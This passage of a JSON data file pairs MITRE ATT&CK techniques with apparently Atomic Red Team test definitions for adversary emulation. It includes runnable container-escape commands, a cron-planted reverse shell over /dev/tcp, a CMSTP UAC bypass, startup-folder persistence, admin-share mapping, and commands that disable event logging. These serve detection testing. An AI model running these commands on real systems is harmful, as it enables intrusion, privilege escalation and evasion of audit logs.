-noninteractive", "name": "powershell"}}]}, "T1611": {"name": "Escape to Host", "technique_id": "attack-pattern--4a5b7ade-8bb5-4853-84ed-23f262002665", "external_id": "T1611", "data_components": ["Kernel Module Load", "Volume Modification", "OS API Execution", "Process Creation", "Container Creation"], "kill_chain_phases": ["privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--b9f0c069-abbe-4a07-a245-2481219a1463", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)\n\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host\u2019s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host.", "atomic_tests": [{"name": "Deploy container using nsenter container escape", "auto_generated_guid": "0b2f9520-a17a-4671-9dba-3bd034099fff", "description": "In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.\n\nAdditional Details:\n- https://twitter.com/mauilion/status/1129468485480751104\n- https://securekubernetes.com/scenario_2_attack/\n", "supported_platforms": ["containers"], "dependency_executor_name": "sh", "dependencies": [{"description": "Verify docker is installed.", "prereq_command": "which docker\n", "get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"}, {"description": "Verify docker service is running.", "prereq_command": "sudo systemctl status docker\n", "get_prereq_command": "sudo systemctl start docker\n"}, {"description": "Verify kind is in the path.", "prereq_command": "which kind\n", "get_prereq_command": "curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64\nchmod +x ./kind\nmv kind /usr/bin/kind\n"}, {"description": "Verify kind-atomic-cluster is created", "prereq_command": "sudo kind get clusters\n", "get_prereq_command": "sudo kind create cluster --name atomic-cluster\n"}, {"description": "Verify kubectl is in path", "prereq_command": "which kubectl\n", "get_prereq_command": "curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x ./kubectl\nmv kubectl /usr/bin/kubectl\n"}], "executor": {"command": "kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'\n", "name": "sh", "cleanup_command": "kubectl --context kind-atomic-cluster delete pod atomic-escape-pod\n"}}, {"name": "Mount host filesystem to escape privileged Docker container", "auto_generated_guid": "6c499943-b098-4bc6-8d38-0956fc182984", "description": "This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.\nThe container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.\nDev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. \n", "supported_platforms": ["containers"], "input_arguments": {"mount_device": {"description": "Path to the device of the host's disk to mount", "type": "path", "default": "/dev/dm-0"}, "mount_point": {"description": "Path where the host filesystem will be mounted", "type": "path", "default": "/mnt/T1611.002"}, "cron_path": {"description": "Path on the host filesystem where cron jobs are stored", "type": "path", "default": "/etc/cron.d"}, "cron_filename": {"description": "Filename of the cron job in cron_path", "type": "string", "default": "T1611_002"}, "listen_address": {"description": "IP address to listen for callback from the host system.", "type": "string", "default": "`ifconfig eth0 | grep inet | awk '{print $2}'`"}, "listen_port": {"description": "TCP Port to listen on for callback from the host system.", "type": "integer", "default": 4444}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Verify mount is installed.", "prereq_command": "which mount\n", "get_prereq_command": "if [ \"\" == \"`which mount`\" ]; then echo \"mount Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install mount ; elif [ -n \"`which yum`\" ]; then sudo yum -y install mount ; fi ; else echo \"mount installed\"; fi\n"}, {"description": "Verify container is privileged.", "prereq_command": "capsh --print | grep cap_sys_admin\n", "get_prereq_command": "if [ \"`capsh --print | grep cap_sys_admin`\" == \"\" ]; then echo \"Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi\n"}, {"description": "Verify mount device (/dev/dm-0) exists.", "prereq_command": "ls #{mount_device}\n", "get_prereq_command": "if [ ! -f #{mount_device} ]; then echo \"Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi\n"}, {"description": "Netcat is installed.", "prereq_command": "which netcat\n", "get_prereq_command": "if [ \"\" == \"`which netcat`\" ]; then echo \"netcat Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install netcat ; elif [ -n \"`which yum`\" ]; then sudo yum -y install netcat ; fi\n"}, {"description": "IP Address is known.", "prereq_command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi\n", "get_prereq_command": "if [ \"\" == \"`which ifconfig`\" ]; then echo \"ifconfig Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install net=tools ; elif [ -n \"`which yum`\" ]; then sudo yum -y install net-tools ; fi\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi\necho -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" > #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" >> #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"(hostname) \" >> #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" >> #{mount_point}#{cron_path}/#{cron_filename}\necho \"(id)\\\" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'\" >> #{mount_point}#{cron_path}/#{cron_filename}\nnetcat -l -p #{listen_port} 2>&1\n", "cleanup_command": "rm #{mount_point}#{cron_path}/#{cron_filename}\numount #{mount_point}\nrmdir #{mount_point}\n"}}]}, "T1547.009": {"name": "Shortcut Modification", "technique_id": "attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179", "external_id": "T1547.009", "data_components": ["File Modification", "File Creation", "Process Creation"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317"], "description": "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176)) to persistently launch malware.", "atomic_tests": [{"name": "Shortcut Modification", "auto_generated_guid": "ce4fc678-364f-4282-af16-2fb4c78005ce", "description": "This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;\ngci -path \"C:\\Users\" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern \"exe\" | FL.\nUpon execution, calc.exe will be launched.\n", "supported_platforms": ["windows"], "input_arguments": {"shortcut_file_path": {"description": "shortcut modified and execute", "type": "path", "default": "%temp%\\T1547.009_modified_shortcut.url"}}, "executor": {"command": "echo [InternetShortcut] > #{shortcut_file_path}\necho URL=C:\\windows\\system32\\calc.exe >> #{shortcut_file_path}\n#{shortcut_file_path}\n", "cleanup_command": "del -f #{shortcut_file_path} >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Create shortcut to cmd in startup folders", "auto_generated_guid": "cfdc954d-4bb0-4027-875b-a1893ce406f2", "description": "LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nto view the new shortcut.\n", "supported_platforms": ["windows"], "executor": {"command": "$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1547.009.\";\n$ShortCut.Save()\n\n$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1547.009.\";\n$ShortCut.Save()\n", "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\" -ErrorAction Ignore\nRemove-Item \"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\" -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}]}, "T1010": {"name": "Application Window Discovery", "technique_id": "attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830", "external_id": "T1010", "data_components": ["Command Execution", "OS API Execution", "Process Creation"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.(Citation: Prevailion DarkWatchman 2021) For example, information about application windows could be used identify potential data to collect as well as identifying security tooling ([Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) to evade.(Citation: ESET Grandoreiro April 2020)\n\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) commands and [Native API](https://attack.mitre.org/techniques/T1106) functions.", "atomic_tests": [{"name": "List Process Main Windows - C# .NET", "auto_generated_guid": "fe94a1c3-3e22-4dc9-9fdf-3a8bdbc10dc4", "description": "Compiles and executes C# code to list main window titles associated with each process.\n\nUpon successful execution, powershell will download the .cs from the Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.\n", "supported_platforms": ["windows"], "input_arguments": {"input_source_code": {"description": "Path to source of C# code", "type": "path", "default": "PathToAtomicsFolder\\T1010\\src\\T1010.cs"}, "output_file_name": {"description": "Name of output binary", "type": "string", "default": "%TEMP%\\T1010.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1010.cs must exist on disk at specified location (#{input_source_code})\n", "prereq_command": "if (Test-Path \"#{input_source_code}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{input_source_code}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile \"#{input_source_code}\"\n"}], "executor": {"command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:#{output_file_name} \"#{input_source_code}\"\n#{output_file_name}\n", "cleanup_command": "del /f /q /s #{output_file_name} >nul 2>&1\n", "name": "command_prompt"}}]}, "T1218.003": {"name": "CMSTP", "technique_id": "attack-pattern--4cbc6a62-9e34-4f94-8a19-5c1a11392a49", "external_id": "T1218.003", "data_components": ["Network Connection Creation", "Command Execution", "Process Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / \u201dSquiblydoo\u201d, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.\n\nCMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)", "atomic_tests": [{"name": "CMSTP Executing Remote Scriptlet", "auto_generated_guid": "34e63321-9683-496b-bbc1-7566bc55e624", "description": "Adversaries may supply CMSTP.exe with INF files infected with malicious commands\n", "supported_platforms": ["windows"], "input_arguments": {"inf_file_path": {"description": "Path to the INF file", "type": "path", "default": "PathToAtomicsFolder\\T1218.003\\src\\T1218.003.inf"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "INF file must exist on disk at specified location (#{inf_file_path})\n", "prereq_command": "if (Test-Path \"#{inf_file_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003.inf\" -OutFile \"#{inf_file_path}\"\n"}], "executor": {"command": "cmstp.exe /s \"#{inf_file_path}\"\n", "name": "command_prompt"}}, {"name": "CMSTP Executing UAC Bypass", "auto_generated_guid": "748cb4f6-2fb3-4e97-b7ad-b22635a09ab0", "description": "Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file\n", "supported_platforms": ["windows"], "input_arguments": {"inf_file_uac": {"description": "Path to the INF file", "type": "path", "default": "PathToAtomicsFolder\\T1218.003\\src\\T1218.003_uacbypass.inf"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "INF file must exist on disk at specified location (#{inf_file_uac})\n", "prereq_command": "if (Test-Path \"#{inf_file_uac}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_file_uac}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf\" -OutFile \"#{inf_file_uac}\"\n"}], "executor": {"command": "cmstp.exe /s \"#{inf_file_uac}\" /au\n", "name": "command_prompt"}}]}, "T1562.002": {"name": "Disable Windows Event Logging", "technique_id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a", "external_id": "T1562.002", "data_components": ["Windows Registry Key Creation", "Process Creation", "Host Status", "Script Execution", "Application Log Content", "Command Execution"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--a2c36a5d-4058-475e-8e77-fff75e50d3b9", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.", "atomic_tests": [{"name": "Disable Windows IIS HTTP Logging", "auto_generated_guid": "69435dcf-c66f-4ec0-a8b1-82beb76b34db", "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n", "supported_platforms": ["windows"], "input_arguments": {"website_name": {"description": "The name of the website on a server", "type": "string", "default": "Default Web Site"}}, "executor": {"command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:true\n", "cleanup_command": "if(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){\n  C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:false *>$null\n}\n", "name": "powershell"}}, {"name": "Disable Windows IIS HTTP Logging via PowerShell", "auto_generated_guid": "a957fb0f-1e85-49b2-a211-413366784b1e", "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n", "supported_platforms": ["windows"], "input_arguments": {"website_name": {"description": "The name of the website on a server", "type": "string", "default": "Default Web Site"}}, "executor": {"command": "set-WebConfigurationProperty -PSPath \"IIS:\\Sites\\#{website_name}\\\" -filter \"system.webServer/httpLogging\" -name dontLog -value $true\n", "cleanup_command": "if(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){\n  C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:false *>$null\n}\n", "name": "powershell"}}, {"name": "Kill Event Log Service Threads", "auto_generated_guid": "41ac52ba-5d5e-40c0-b267-573ed90489bd", "description": "Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html", "supported_platforms": ["windows"], "executor": {"command": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n$url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"\n$output = \"$env:TEMP\\Invoke-Phant0m.ps1\"\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\ncd $env:TEMP\nImport-Module .\\Invoke-Phant0m.ps1\nInvoke-Phant0m\n", "cleanup_command": "Write-Host \"NEED TO Restart-Computer TO ENSURE LOGGING RETURNS\" -fore red\nRemove-Item \"$env:TEMP\\Invoke-Phant0m.ps1\" -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Impair Windows Audit Log Policy", "auto_generated_guid": "5102a3a7-e2d7-4129-9e45-f483f2e0eea8", "description": "Disables the windows audit policy to prevent key host based telemetry being written into the event logs.\n[Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)", "supported_platforms": ["windows"], "executor": {"command": "auditpol /set /category:\"Account Logon\" /success:disable /failure:disable\nauditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable\nauditpol /set /category:\"Detailed Tracking\" /success:disable\n", "cleanup_command": "auditpol /set /category:\"Account Logon\" /success:enable /failure:enable\nauditpol /set /category:\"Detailed Tracking\" /success:enable\nauditpol /set /category:\"Logon/Logoff\" /success:enable /failure:enable\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Clear Windows Audit Policy Config", "auto_generated_guid": "913c0e4e-4b37-4b78-ad0b-90e7b25010f6", "description": "Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.", "supported_platforms": ["windows"], "executor": {"command": "auditpol /clear /y\nauditpol /remove /allusers\n", "cleanup_command": "auditpol /set /category:\"Account Logon\" /success:enable /failure:enable\nauditpol /set /category:\"Detailed Tracking\" /success:enable\nauditpol /set /category:\"Logon/Logoff\" /success:enable /failure:enable\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable Event Logging with wevtutil", "auto_generated_guid": "b26a3340-dad7-4360-9176-706269c74103", "description": "Wevtutil can be used to disable logs. \nNOTE: RansomEXX ransomware uses this to disable Security logs post-encryption.\n", "supported_platforms": ["windows"], "input_arguments": {"log_name": {"description": "Name of the log to be disabled", "type": "string", "default": "Microsoft-Windows-IKE/Operational"}}, "executor": {"command": "wevtutil sl \"#{log_name}\" /e:false\n", "cleanup_command": "wevtutil sl \"#{log_name}\" /e:true\n", "name": "command_prompt"}}, {"name": "Makes Eventlog blind with Phant0m", "auto_generated_guid": "3ddf3d03-f5d6-462a-ad76-2c5ff7b6d741", "description": "Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog\n", "supported_platforms": ["windows"], "input_arguments": {"file_name": {"description": "exe version of Phant0m", "type": "path", "default": "PathToAtomicsFolder\\T1562.002\\bin\\Phant0m.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Phant0m.exe must exist on disk at specified location (#{file_name})\n", "prereq_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1562.002/bin/Phant0m.exe\" -OutFile \"#{file_name}\" -UseBasicParsing\n"}], "executor": {"command": "\"#{file_name}\"\n", "cleanup_command": "echo \"Sorry you have to reboot\"\n", "name": "command_prompt"}}]}, "T1021.002": {"name": "SMB/Windows Admin Shares", "technique_id": "attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541", "external_id": "T1021.002", "data_components": ["Logon Session Creation", "Network Connection Creation", "Network Traffic Flow", "Network Share Access", "Command Execution"], "kill_chain_phases": ["lateral-movement"], "data_source_platforms": [], "mitigations": ["course-of-action--1dcaeb21-9348-42ea-950a-f842aaf1ae1f", "course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d", "course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)", "atomic_tests": [{"name": "Map admin share", "auto_generated_guid": "3386975b-367a-4fbb-9d77-4dcf3639ffd3", "description": "Connecting To Remote Shares\n", "supported_platforms": ["windows"], "input_arguments": {"user_name": {"description": "Username", "type": "string", "default": "DOMAIN\\Administrator"}, "share_name": {"description": "Examples C$, IPC$, Admin$", "type": "string", "default": "C$"}, "password": {"description": "Password", "type": "string", "default": "P@ssw0rd1"}, "computer_name": {"description": "Target Computer Name", "type": "string", "default": "Target"}}, "executor": {"command": "cmd.exe /c \"net use \\\\#{computer_name}\\#{share_name} #{password} /u:#{user_name}\"\n", "name": "command_prompt"}}, {"name": "Map Admin Share PowerShell", "auto_generated_guid": "514e9cd7-9207-4882-98b1-c8f791bae3c5", "description": "Map Admin share utilizing PowerShell\n", "supported_platforms": ["windows"], "input_arguments": {"share_name": {"description": "Examples C$, IPC$, Admin$", "type": "string", "default": "C$"}, "map_name": {"description": "Mapped Drive Letter", "type": "string", "default": "g"}, "computer_name": {"description": "Target Computer Name", "type": "string", "default": "Target"}}, "executor": {"command": "New-PSDrive -name #{map_name} -psprovider filesystem -root \\\\#{computer_name}\\#{share_name}\n", "name": "powershell"}}, {"name": "Copy and Execute File with PsExec", "auto_generated_guid": "0eb03d41-79e4-4393-8e57-6344856be1cf", "description": "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n", "supported_platforms": ["windows"], "input_arguments": {"command_path": {"description": "File to copy and execute", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}, "remote_host": {"description": "Remote computer to receive the copy and execute the file", "type": "string", "default": "\\\\localhost"}, "psexec_exe": {"description": "Path to PsExec", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})\n", "prereq_command": "if (Test-Path \"#{psexec_exe}\") { exit 0} else { exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item 